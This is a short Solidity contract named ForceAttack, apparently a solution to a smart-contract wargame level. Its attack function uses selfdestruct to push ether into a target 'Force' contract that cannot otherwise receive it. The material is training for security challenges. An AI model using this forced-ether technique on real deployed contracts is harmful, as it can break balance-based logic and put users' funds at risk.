// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Force.sol";

contract ForceAttack {
    Force forceContract;

    constructor(address _forceContractAddress) public {
        forceContract = Force(_forceContractAddress);
    }

    function attack() public {
        selfdestruct(payable(address(forceContract)));
    }
}
